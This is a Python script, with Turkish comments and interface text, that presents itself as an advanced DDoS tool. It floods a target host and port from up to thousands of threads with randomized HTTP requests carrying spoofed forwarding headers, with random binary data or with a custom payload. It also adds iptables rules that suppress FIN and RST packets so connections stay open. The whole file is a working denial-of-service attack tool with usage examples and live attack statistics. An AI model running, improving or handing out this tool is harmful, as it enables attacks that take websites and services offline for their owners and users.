#!/usr/bin/env python
import socket
from time import sleep, time
from threading import Thread, active_count, Lock
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys

# İstatistikler için thread-safe sayaçlar
connected = 0
dropped = 0 
payloads = 0
bytes_sent = 0
stats_lock = Lock()

example_text = ''' \n⚡ GELİŞMİŞ DDoS ARACI - YÜKSEK KAPASİTELİ ⚡

Örnek Kullanım:
  python %s example.com/test.php -p 80 -http -t 1000
  python %s example.com/hello/ -p 443 -ssl -http -t 2000
  python %s example.com -p 80 -http -t 1500
  python %s example.com -p 21 -payload 68656c6c6f -t 800
  python %s example.com -p 22 -t 3000

📊 İstatistikler:
  Bağlantılar - Hedefe yapılan TCP bağlantı sayısı
  Gönderilen - Hedefe ulaşan payload sayısı  
  Başarısız - Başarısız bağlantı/veri gönderim sayısı
  Veri      - Toplam gönderilen veri miktarı (MB)
 
''' % (sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

parser = argparse.ArgumentParser(epilog=example_text, formatter_class=argparse.RawTextHelpFormatter)
parser._action_groups.pop()
required = parser.add_argument_group('🔰 Zorunlu Parametreler')
optional = parser.add_argument_group('🎛️  Opsiyonel Parametreler')

required.add_argument('target', help='Saldırı hedefi (URL/IP)')
required.add_argument('-p', dest='port', help='Hedef port', type=int, required=True)

optional.add_argument('-t', dest='THREADS', type=int, default=1000, help='Thread sayısı (Varsayılan: 1000)')
optional.add_argument('-ssl', action='store_true',  help='SSL/TLS kullan')
optional.add_argument('-http', action='store_true',  help='HTTP headerları kullan (özel payload yoksa)')
optional.add_argument('-payload', help='Özel payload (hex formatında)')
optional.add_argument('-power', type=int, default=5, choices=range(1, 11), 
                     help='Saldırı gücü 1-10 arası (Varsayılan: 5)')
optional.add_argument('-time', type=int, default=0, help='Saldırı süresi (saniye)')

print("\n🚀 GELİŞMİŞ DDoS ARACI BAŞLATILIYOR...\n")
args = parser.parse_args()
port = args.port

# Hedef URL ayıklama
target = args.target.replace('http://','').replace('https://','')

if '/' in target and args.http:
    path = target[target.find('/'):]
    target = target[:target.find('/')]
else:
    path = '/'

# Özel payload decode
try:
    if args.payload:
        custom_payload = args.payload.decode('hex')
        print("✅ Özel payload kullanılıyor")
    else:
        custom_payload = ''
except:
    print('❌ Geçersiz hex payload formatı!')
    sys.exit()

# Root kontrolü
if geteuid() != 0:
    print("❌ Bu aracı root olarak çalıştırmanız gerekiyor!")
    sys.exit()

# Durdurma sinyali
stop = False
def signal_handler(signal, frame):
    global stop
    print("\n\n⚠️  Saldırı durduruluyor...")
    stop = True
signal.signal(signal.SIGINT, signal_handler)

# İstatistik güncelleme fonksiyonu
def update_stats(conn=0, drop=0, pay=0, bytes=0):
    global connected, dropped, payloads, bytes_sent
    with stats_lock:
        connected += conn
        dropped += drop
        payloads += pay
        bytes_sent += bytes

# Gelişmiş string generator
def string_generator(size=None):
    if size is None:
        size = random.randint(10, 100)
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

# GÜÇLÜ HTTP Payload Generator
def http_payload():
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    
    method = random.choice(methods)
    
    # Büyük payload oluştur
    payload_lines = []
    
    # Request line
    query_params = '&'.join([f'{string_generator(5)}={string_generator(20)}' for _ in range(random.randint(3, 8))])
    payload_lines.append(f'{method} {path}?{query_params} HTTP/1.1\r\n')
    
    # Headers
    payload_lines.append(f'Host: {target}\r\n')
    payload_lines.append(f'User-Agent: {random.choice(user_agents)}\r\n')
    payload_lines.append(f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n')
    payload_lines.append(f'Accept-Language: en-US,en;q=0.9\r\n')
    payload_lines.append(f'Accept-Encoding: gzip, deflate, br\r\n')
    payload_lines.append(f'Connection: keep-alive\r\n')
    payload_lines.append(f'Cache-Control: no-cache\r\n')
    payload_lines.append(f'Upgrade-Insecure-Requests: 1\r\n')
    
    # Ek headerlar
    for _ in range(random.randint(3, 8)):
        header_name = string_generator(random.randint(5, 12))
        header_value = string_generator(random.randint(10, 30))
        payload_lines.append(f'X-{header_name}: {header_value}\r\n')
    
    # IP spoofing
    fake_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    payload_lines.append(f'X-Forwarded-For: {fake_ip}\r\n')
    payload_lines.append(f'X-Real-IP: {fake_ip}\r\n')
    
    # POST için body
    if method in ['POST', 'PUT']:
        content_type = random.choice(['application/x-www-form-urlencoded', 'application/json'])
        payload_lines.append(f'Content-Type: {content_type}\r\n')
        
        if content_type == 'application/json':
            body = '{"data":"' + string_generator(100) + '","timestamp":' + str(int(time())) + '}'
        else:
            body = '&'.join([f'{string_generator(6)}={string_generator(25)}' for _ in range(random.randint(5, 10))])
        
        payload_lines.append(f'Content-Length: {len(body)}\r\n\r\n')
        payload_lines.append(body)
    else:
        payload_lines.append('\r\n')
    
    return ''.join(payload_lines)

# Binary payload generator
def generate_binary_payload():
    size = random.randint(500, 5000)  # 500-5000 byte arası
    return ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) 
                   for _ in range(size)).encode()

# GELİŞMİŞ DOS fonksiyonu
def spam(target_ip):
    local_connected = 0
    local_dropped = 0
    local_payloads = 0
    local_bytes_sent = 0
    last_update = time()
    
    # Saldırı gücü çarpanı
    power_multiplier = args.power
    
    while not stop:
        # Süre kontrolü
        if args.time > 0 and (time() - start_time) > args.time:
            break
            
        sockets = []
        try:
            # Güce bağlı olarak çoklu socket oluştur
            for _ in range(min(power_multiplier, 3)):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                try:
                    s.connect((target_ip, port))
                    local_connected += 1
                    sockets.append(s)
                except:
                    local_dropped += 1
            
            # Her socket'e çoklu veri gönder
            for s in sockets:
                try:
                    # SSL
                    if args.ssl:
                        s = ssl.wrap_socket(s, cert_reqs=ssl.CERT_NONE)
                    
                    # Her socket için çoklu gönderim
                    for _ in range(random.randint(1, power_multiplier)):
                        if args.http and not args.payload:
                            payload_data = http_payload()
                        elif args.payload:
                            payload_data = custom_payload
                        else:
                            payload_data = generate_binary_payload()
                        
                        # Gönder
                        sent = s.send(payload_data if isinstance(payload_data, bytes) else payload_data.encode())
                        local_payloads += 1
                        local_bytes_sent += sent
                        
                        # Kısa bekleme
                        sleep(0.01 * random.random())
                    
                    s.close()
                    
                except Exception as e:
                    local_dropped += 1
                    try:
                        s.close()
                    except:
                        pass
                    
        except Exception as e:
            local_dropped += 1
        
        # İstatistikleri düzenli güncelle
        current_time = time()
        if current_time - last_update >= 0.5:  # 0.5 saniyede bir
            update_stats(local_connected, local_dropped, local_payloads, local_bytes_sent)
            local_connected = local_dropped = local_payloads = local_bytes_sent = 0
            last_update = current_time
    
    # Kalan istatistikleri gönder
    update_stats(local_connected, local_dropped, local_payloads, local_bytes_sent)

# İstatistik gösterici
def show_stats():
    global connected, dropped, payloads, bytes_sent
    last_time = time()
    last_payloads = payloads
    peak_speed = 0
    
    while not stop:
        current_time = time()
        elapsed = current_time - last_time
        
        # Hız hesapla
        current_payloads = payloads
        speed = (current_payloads - last_payloads) / elapsed if elapsed > 0.5 else 0
        peak_speed = max(peak_speed, speed)
        
        # Ekranı temizle ve istatistikleri göster
        system('clear')
        print("🚀 GELİŞMİŞ DDoS ARACI - AKTİF SALDIRI")
        print("=" * 50)
        print(f"🎯 Hedef: {target}:{port}")
        print(f"⚡ Thread: {args.THREADS} | 💪 Güç: {args.power}/10")
        print("=" * 50)
        print(f"📡 Bağlantılar: {connected:,}")
        print(f"📤 Gönderilen:  {payloads:,}")
        print(f"❌ Başarısız:   {dropped:,}")
        print(f"💾 Veri:        {bytes_sent/1024/1024:.2f} MB")
        print(f"📊 Anlık Hız:   {speed:.0f} paket/s")
        print(f"🔥 Tepe Hız:    {peak_speed:.0f} paket/s")
        print(f"⏱️  Süre:        {int(current_time - start_time)}s")
        print("\n⏹️  Durdurmak için CTRL+C")
        
        last_payloads = current_payloads
        last_time = current_time
        sleep(1)

if __name__ == '__main__':
    start_time = time()
    target_ip = socket.gethostbyname(target)
    
    print(f"🎯 Hedef: {target} ({target_ip}:{port})")
    print(f"⚡ Thread Sayısı: {args.THREADS}")
    print(f"💪 Saldırı Gücü: {args.power}/10")
    print(f"⏱️  Süre: {args.time if args.time > 0 else 'Sınırsız'}s")
    
    # IPTables kuralları
    try:
        system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP 2>/dev/null')
        print("✅ IPTables kuralları eklendi")
    except:
        print("⚠️  IPTables kuralları eklenemedi")
    
    # Thread'leri başlat
    threads = []
    for i in range(args.THREADS):
        t = Thread(target=spam, args=(target_ip,))
        threads.append(t)
        t.start()
    
    print(f"✅ {len(threads)} thread başlatıldı")
    
    # İstatistik thread'ini başlat
    stats_thread = Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Ana döngü
    try:
        while True:
            if stop or (args.time > 0 and (time() - start_time) > args.time):
                break
            
            # Thread kontrolü
            if active_count() < args.THREADS * 0.7:
                print(f"⚠️  Thread kaybı: {active_count() - 2}/{args.THREADS}")
            
            sleep(1)
            
    except KeyboardInterrupt:
        stop = True
    
    # Temizlik
    print("\n🧹 Temizlik yapılıyor...")
    try:
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP 2>/dev/null')
        print("✅ IPTables kuralları temizlendi")
    except:
        print("⚠️  IPTables temizleme başarısız")
    
    # Son istatistikler
    total_time = time() - start_time
    print("\n🎯 SALDIRI TAMAMLANDI")
    print("=" * 50)
    print(f"📡 Toplam Bağlantı: {connected:,}")
    print(f"📤 Toplam Gönderim: {payloads:,}") 
    print(f"❌ Toplam Hata:     {dropped:,}")
    print(f"💾 Toplam Veri:    {bytes_sent/1024/1024:.2f} MB")
    print(f"⏱️  Toplam Süre:    {int(total_time)}s")
    
    if total_time > 0:
        avg_speed = payloads / total_time
        print(f"📊 Ortalama Hız:   {avg_speed:.0f} paket/s")
    
    print("=" * 50)
